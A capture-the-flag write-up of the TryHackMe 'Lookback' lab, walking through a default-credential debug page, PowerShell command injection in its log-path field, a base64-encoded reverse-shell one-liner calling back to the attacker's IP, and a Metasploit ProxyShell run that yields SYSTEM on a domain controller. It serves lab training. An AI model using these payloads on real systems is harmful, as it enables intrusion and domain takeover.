## Lookback - THM
Oct 17, 2026 · @Gh0ulH4x
- You’ve been asked to run a vulnerability test on a production environment.
```Description
The Lookback company has just started the integration with Active Directory. Due to the coming deadline, the system integrator had to rush the deployment of the environment. Can you spot any vulnerabilities?  

Start the Lab Machine by pressing the Start Lab Machine button at the top of this task. You may access the VM using the AttackBox or your VPN connection. This machine does not respond to ping (ICMP).  

Can you find all the flags?
The VM takes about 5/10 minutes to fully boot up.
_Sometimes to move forward, we have to go backward._
_So if you get stuck, try to look back!_
```
-----
## Machine Info
```Info
IP : 10.48.136.172
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: WIN-12OUO7A66M7
|   DNS_Domain_Name: thm.local
|   DNS_Computer_Name: WIN-12OUO7A66M7.thm.local
|   DNS_Tree_Name: thm.local
```
---
## Recon
- A port scan shows a Windows host doubling as web server, mail server, and domain controller:
```bash
PORT     STATE SERVICE       REASON          VERSION
80/tcp   open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
443/tcp  open  https?        syn-ack ttl 126
| ssl-cert: Subject: commonName=WIN-12OUO7A66M7
| Subject Alternative Name: DNS:WIN-12OUO7A66M7, DNS:WIN-12OUO7A66M7.thm.local
| Issuer: commonName=WIN-12OUO7A66M7
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-01-25T21:34:02
| Not valid after:  2028-01-25T21:34:02
| MD5:     84e0 805f 3667 c38f d820 4e7c 1da0 4215
| SHA-1:   0845 8fd9 d9bf c4c6 48db 1f82 d3e7 324e a924 52d7
| SHA-256: 79e6 37e6 a043 6c39 f95f 682d e545 27d9 5c90 9412 e173 45a0 acbe c506 2094 7389
3389/tcp open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: WIN-12OUO7A66M7
|   DNS_Domain_Name: thm.local
|   DNS_Computer_Name: WIN-12OUO7A66M7.thm.local
|   DNS_Tree_Name: thm.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-10-15T05:39:50+00:00
```

- The RDP and SSL certificate banners confirm the domain and hostname (`THM` / `thm.local` / `WIN-12OUO7A66M7`), which also needs adding to `/etc/hosts` for the HTTPS vhost to resolve correctly:
```bash
sudo nano /etc/hosts
<IP> WIN-12OUO7A66M7.thm.local
```
## Web Enumeration — Flag 1
- Directory brute-forcing over HTTPS turns up Exchange's own endpoints plus two unexpected ones:
```bash
$ gobuster dir -u https://win-12ouo7a66m7.thm.local/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -x asp,aspx,html,txt,config -b "403,404" -k

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
rpc                
owa                [--> https://win-12ouo7a66m7.thm.local/owa/auth/logon.aspx?url=https%3a%2f%2fwin-12ouo7a66m7.thm.local%2fowa&reason=0]
ecp                [--> https://win-12ouo7a66m7.thm.local/owa/auth/logon.aspx?url=https%3a%2f%2fwin-12ouo7a66m7.thm.local%2fecp&reason=0]
test
powershell         
```
- Try Every Endpoint 
```bash
rpc                
owa                [--> https://win-12ouo7a66m7.thm.local/owa/auth/logon.aspx?url=https%3a%2f%2fwin-12ouo7a66m7.thm.local%2fowa&reason=0]
ecp                [--> https://win-12ouo7a66m7.thm.local/owa/auth/logon.aspx?url=https%3a%2f%2fwin-12ouo7a66m7.thm.local%2fecp&reason=0]
```
- `/owa` and `/ecp` are the expected Outlook Web Access login pages. `/test`, however, opens an undocumented pop-up login, and the default credential pair `admin:admin` gets straight in — landing on a "Log Analyzer" debug page that was clearly never meant to reach production:
```html
<html>
<body>    
<form method="post" action="./" id="ctl00">
<div class="aspNetHidden">
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUJNjIzMDE2ODg3ZGT7siySLLR4N5hubGdmiP0PjksznzIN4GbMWcl7WCIX4Q==" />
</div>

<div class="aspNetHidden">

	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="297DB184" />
	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdAANTQko9mE2XXNsodhzB3pQcZhKn2xIin3da/xugJk3mFmNW1/g3lL93h5ozWJAQom/7xvfovXRw0Hwm2fMxZdfRfamD117i7VtAOGOcSCYxzQ==" />
</div>        
<h1><p><span id="L_p" style="display:inline-block;width:800px;">This interface should be removed on production!</span></h1>
<p><span id="L_f" style="display:inline-block;width:180px;">THM{Security_Through_Obscurity_Is_Not_A_Defense}</span>
<b><p><span id="L_flag" style="display:inline-block;width:180px;">LOG ANALYZER</span></b></b>
<p><span id="L_a" style="display:inline-block;width:80px;">Path:</span>        
<input name="xlog" type="text" value="BitlockerActiveMonitoringLogs" id="xlog" style="width:300px;" />        
<p><input type="submit" name="Button" value="Run" id="Button" style="width:100px;" />        
<p><span id="result"></span>       
</form>
</body>
</html>
```
## Command Injection → Reverse Shell — Flag 2
- The `xlog` field feeds straight into a server-side `Get-Content` PowerShell call. Supplying a bogus path confirms it:
```html
<input name="xlog" type="text" value="BitlockerActiveMonitoringLogs" id="xlog" style="width:300px;" />        
```
- Change it to something else like `a`
```bash
At line:1 char:1
+ Get-Content('C:\a')
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\a:String) [Get-Content], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
```
- Looks Like a power-shell which we saw earlier  in the hidden directories
```
input = '); whoami # 
```
- Closing the string and chaining a second command with `)); ... #` (the trailing `#` comments out the rest of the original line) achieves command injection:
```
Get-Content : Access to the path 'C:\' is denied.
At line:1 char:1
+ Get-Content('C:\'); whoami #')
+ ~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
 
thm\admin
```
- Got the `admin` user let's get the inside the shell
```bash
input = '); powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMgA4AC4AMQA2ADYAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA #
```
- With command execution confirmed as `thm\admin`, a base64-encoded PowerShell reverse-shell one-liner is injected the same way to get an interactive shell:
```bash

PS C:\windows\system32\inetsrv> cd C:/Users
PS C:\Users> dir
PS C:\Users> cd dev	
PS C:\Users\dev> dir
PS C:\Users\dev> cd Desktop	
PS C:\Users\dev\Desktop> dir


    Directory: C:\Users\dev\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/21/2023  12:28 PM            512 TODO.txt
-a----        2/12/2023  11:53 AM             29 user.txt

PS C:\Users\dev\Desktop> more user.txt
THM{Stop_Reading_Start_Doing}
```
## Post-Exploitation Enumeration
- A `TODO.txt` left on the `dev` user's desktop is a direct admission of the deployment's unfinished state — and names the critical gap:
```
Promote Server to Domain Controller [DONE]
Setup Microsoft Exchange [DONE]
Setup IIS [DONE]
Remove the log analyzer [TO BE DONE]
Add all the users from the infra department [TO BE DONE]
Install the Security Update for MS Exchange [TO BE DONE]
Setup LAPS [TO BE DONE]
```
- `whoami /user` confirms the shell is already running as `thm\admin`, a member of `IIS_IUSRS` and the Exchange application pool identity — but the real prize is the unpatched Exchange server named in the TODO list.
```
PS C:\windows\system32\inetsrv> whoami /user; whoami /groups

USER INFORMATION
----------------

User Name SID
========= ==============================================
thm\admin S-1-5-21-2402911436-1669601961-3356949615-1149

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                                           Attributes
=========================================== ================ ============================================================= ==================================================
Everyone                                    Well-known group S-1-1-0                                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                          Well-known group S-1-5-3                                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                               Well-known group S-1-2-1                                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                           Alias            S-1-5-32-568                                                  Mandatory group, Enabled by default, Enabled group
LOCAL                                       Well-known group S-1-2-0                                                       Mandatory group, Enabled by default, Enabled group
IIS APPPOOL\DefaultAppPool                  Well-known group S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
PS C:\windows\system32\inetsrv>
```
- According o `TODO.txt` reveal a critical vulnerability and misconfiguration context: **the Security Update for MS Exchange has not been installed** (`[TO BE DONE]`)
- Exchange is running and vulnerable to unauthenticated remote code execution or privilege escalation flaws (such as ProxyShell: CVE-2021-34473, CVE-2021-34523, CVE-2021-31207, or ProxyLogon: CVE-2021-26855)
## Exchange ProxyShell → Domain Compromise — Final Flag

Checking the installed Exchange build confirms a version vulnerable to the ProxyShell chain (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207):
```bash
[System.Diagnostics.FileVersionInfo]::GetVersionInfo("C:\Program Files\Microsoft\Exchange Server\V15\Bin\Exsetup.exe").FileVersion
15.02.0858.005
```
- Version - `15.02.0858.005`  Confirms that it is vulnerable to `CVE-2021-34473`
- Metasploit's ProxyShell module, pointed at a valid mailbox address recovered from the TODO note, grants unauthenticated pre-auth RCE as SYSTEM:
```bash
msf exploit(windows/http/exchange_proxyshell_rce) > set LHOST tun0
LHOST => 192.168.128.166
msf exploit(windows/http/exchange_proxyshell_rce) > set LPORT 4445
LPORT => 4445
msf exploit(windows/http/exchange_proxyshell_rce) >  set EMAIL dev-infrastracture-team@thm.local
EMAIL => dev-infrastracture-team@thm.local
msf exploit(windows/http/exchange_proxyshell_rce) >  set RHOSTS WIN-12OUO7A66M7.thm.local
RHOSTS => WIN-12OUO7A66M7.thm.local
msf exploit(windows/http/exchange_proxyshell_rce) > run
[*] Started reverse TCP handler on 192.168.128.166:4445
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Target is vulnerable
[*] Attempt to exploit for CVE-2021-34473
[*] Retrieving backend FQDN over RPC request
[*] Internal server name: win-12ouo7a66m7.thm.local
[*] Assigning the 'Mailbox Import Export' role via dev-infrastracture-team@thm.local
[+] Successfully assigned the 'Mailbox Import Export' role
[+] Proceeding with SID: S-1-5-21-2402911436-1669601961-3356949615-1144 (dev-infrastracture-team@thm.local)
[*] Saving a draft email with subject 'VkU5pWdk0jN' containing the attachment with the embedded webshell
[*] Writing to: C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\egl6CRU6sZ.aspx
[*] Waiting for the export request to complete...
[+] The mailbox export request has completed
[*] Triggering the payload
[*] Sending stage (255679 bytes) to 10.49.138.133
[+] Deleted C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\egl6CRU6sZ.aspx
[*] Meterpreter session 1 opened (192.168.128.166:4445 -> 10.49.138.133:10630) at 2026-10-17 07:28:38 -0400
[*] Removing the mailbox export request
[*] Removing the draft email

meterpreter > shell
Process 3248 created.
Channel 2 created.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\system
```
- A SYSTEM shell on the domain controller is full domain compromise. The final flag sits in the Administrator's own documents:
```bash
 Directory of c:\Users\Administrator\Documents

02/12/2023  12:57 PM    <DIR>          .
02/12/2023  12:57 PM    <DIR>          ..
02/12/2023  12:57 PM                35 flag.txt
               1 File(s)             35 bytes
               2 Dir(s)  13,431,934,976 bytes free

c:\Users\Administrator\Documents>more flag.txt
more flag.txt
THM{Looking_Back_Is_Not_Always_Bad}
```
# ## Attack Path Summary

|   |   |   |
|---|---|---|
|#|Flag|Vulnerability|
|1|`THM{Security_Through_Obscurity_Is_Not_A_Defense}`|Undocumented `/test` debug endpoint, default `admin:admin` creds|
|2|`THM{Stop_Reading_Start_Doing}`|PowerShell command injection in the log-analyzer's path parameter → reverse shell|
|3|`THM{Looking_Back_Is_Not_Always_Bad}`|Unpatched Exchange, ProxyShell (CVE-2021-34473/34523/31207) → SYSTEM on the DC|

1. An undocumented `/test` endpoint, left over from development, opens with trivial `admin:admin` credentials and exposes a debug "log analyzer" tool (Flag 1).
2. The analyzer's path field is unsanitized and concatenated into a server-side PowerShell command, giving command injection and confirming execution as `thm\admin`.
3. A base64-encoded PowerShell payload turns that injection into an interactive reverse shell, recovering the low-privilege user flag (Flag 2).
4. A `TODO.txt` left on the desktop admits the Exchange security update was never installed, pointing straight at ProxyShell.
5. Confirming the vulnerable Exchange build and running Metasploit's ProxyShell module grants an unauthenticated SYSTEM shell on the domain controller, yielding the final flag (Flag 3).